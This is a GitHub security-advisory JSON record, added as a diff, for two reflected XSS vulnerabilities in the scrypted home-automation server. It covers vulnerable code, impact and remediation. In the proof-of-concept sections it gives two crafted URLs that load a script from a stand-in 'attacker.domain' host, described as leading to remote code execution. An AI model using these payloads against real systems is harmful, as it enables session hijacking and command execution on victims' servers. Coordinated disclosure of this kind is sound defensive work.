@@ -1,0 +1,104 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-w4hv-vmv9-hgcr",
+  "modified": "2024-02-16T19:29:31Z",
+  "published": "2024-02-16T19:29:31Z",
+  "aliases": [
+
+  ],
+  "summary": "GitHub Security Lab (GHSL) Vulnerability Report, scrypted: `GHSL-2023-218`, `GHSL-2023-219`",
+  "details": "# GitHub Security Lab (GHSL) Vulnerability Report, scrypted: `GHSL-2023-218`, `GHSL-2023-219`\n\nThe [GitHub Security Lab](https://securitylab.github.com) team has identified potential security vulnerabilities in [scrypted](https://github.com/koush/scrypted).\n\nWe are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.\n\nIf at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2023-218` or `GHSL-2023-219` as a reference). See also [this blog post](https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/) written by GitHub's Advisory Curation team which explains what CVEs and advisories are, why they are important to track vulnerabilities and keep downstream users informed, the CVE assigning process, and how they are used to keep open source software secure.\n\nIf you are _NOT_ the correct point of contact for this report, please let us know!\n\n## Summary\n\nTwo refelcted Cross-Site Scripting (XSS) vulnerabilities exist in scrypted that may allow an attacker to impersonate any user who clicks on specially crafted links. In the worst case, an attacker may be able to impersonate an administrator and run arbitrary commands.\n\n## Project\n\nscrypted\n\n## Tested Version\n\n[v55.0](https://github.com/koush/scrypted/releases/tag/v0.55.0)\n\n## Details\n\n### Issue 1: reflected XSS in [`plugin-http.ts`](https://github.com/koush/scrypted/blob/71cbe83a2a20f743342df695ca7b98482b73e60f/server/src/plugin/plugin-http.ts#L45) (`GHSL-2023-218`)\n\nThe `owner` and `pkg` parameters are reflected back in the response when the endpoint is not found, allowing for a reflected XSS vulnerability.\n\n```javascript\nconst { owner, pkg } = req.params;\n        let endpoint = pkg;\n        if (owner)\n            endpoint = `@${owner}/${endpoint}`;\n        const pluginData = await this.getEndpointPluginData(req, endpoint, isUpgrade, isEngineIOEndpoint);\n\n        if (!pluginData) {\n            end(404, `Not Found (plugin or device \"${endpoint}\" not found)`);\n            return;\n        }\n\n\n```\n\n#### Impact\n\nThis issue may lead to `Remote Code Execution`.\n\n#### Remediation\n\nIn order to remediate, ensure that parameters are not reflected back in the response. In addition, on error responses where html is unnecessary, set the `text/plain` Content-Type to prevent XSS (express defaults to text/html).\n\n#### Resources\n\nProof of Concept:\n\nThe following url will create a script tag in the current document which will load `attacker.domain/rce.js`. This JavaScript file can then be used to communicate with the server over HTTP via RPC, and send some requests to get the `nativeId` and `proxyID` for the `automation:update-plugins` and achieve the ability to run shell commands at a specified time.\n\nhttps://localhost:10443/endpoint/%3Cimg%20src%20onerror=a=document.createElement('script');a.setAttribute('src',document.location.hash.substr(1));document.head.appendChild(a)%3E/pkg#//attacker.domain/rce.js\n\nIn the browser, you should see the script element be created with the src as `https://attacker.domain/rce.js`.\n\n### Issue 2: reflected XSS in [`plugins/core/ui/src/Login.vue`](https://github.com/koush/scrypted/blob/v0.55.0/plugins/core/ui/src/Login.vue#L79) (`GHSL-2023-219`)\n\nA reflected XSS vulnerability exists in the login page via the `redirect_uri` parameter. By specifying a url with the javascript scheme (`javascript:`), an attacker can run arbitrary JavaScript code after the login.\n\n```javascript\n  try {\n          const redirect_uri = new URL(window.location).searchParams.get('redirect_uri');\n          if (redirect_uri) {\n            window.location = redirect_uri;\n            return;\n          }\n\n        }\n```\n\n#### Impact\n\nThis issue may lead to `Remote Code Execution`.\n\n#### Remediation\n\nIn order to remediate, ensure user-controlled data is not placed into the DOM. Additionally, this is also an open redirect vulnerability because the url is not validated and a user may be redirected to an attacker controlled website after logging in, not knowing they have left the actual real  website. If this redirect_uri parameter is supposed to only redirect to the current website/domain, please incorporate a check that it is only redirecting to the current domain.\n\n#### Resources\nProof of Concept:\n\nWhen the user is not logged in, send a link to the server with the parameter:\n\n `redirect_uri=javascript:var script = document.createElement('script');script.src = 'https://attacker.domain'; document.head.appendChild(script);`\n\nat the end of the uri (but before the #).\n\n\nExample: `https://localhost:10443/endpoint/test/test?redirect_uri=javascript:var%20script%20=%20document.createElement('script');script.src%20=%20'https://attacker.domain';%20document.head.appendChild(script);#//`\n\n\nSimilar to Proof of Concept 1 this will load a JavaScript file which can make authenticated requests to the server, possibly leading to RCE.\n\n## GitHub Security Advisories\n\nWe recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).\n\n## Credit\n\nThese issues were discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs).\nThis vulnerability was found with the help of [CodeQL Reflected XSS query](https://codeql.github.com/codeql-query-help/javascript/js-reflected-xss/).\n\n## Contact\n\nYou can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-218` or `GHSL-2023-219` in any communication regarding these issues.\n\n## Disclosure Policy\n\nThis report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@scrypted/server"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.56.0"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@scrypted/core"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.1.142"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/koush/scrypted/security/advisories/GHSA-w4hv-vmv9-hgcr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47620"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47623"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/koush/scrypted"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/koush/scrypted/blob/71cbe83a2a20f743342df695ca7b98482b73e60f/server/package.json"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/koush/scrypted/blob/71cbe83a2a20f743342df695ca7b98482b73e60f/server/src/plugin/plugin-http.ts#L45"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/koush/scrypted/blob/v0.55.0/plugins/core/package.json"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/koush/scrypted/blob/v0.55.0/plugins/core/ui/src/Login.vue#L79"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/koush/scrypted/releases/tag/v0.55.0"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-02-16T19:29:31Z",
+    "nvd_published_at": null
+  }
+}
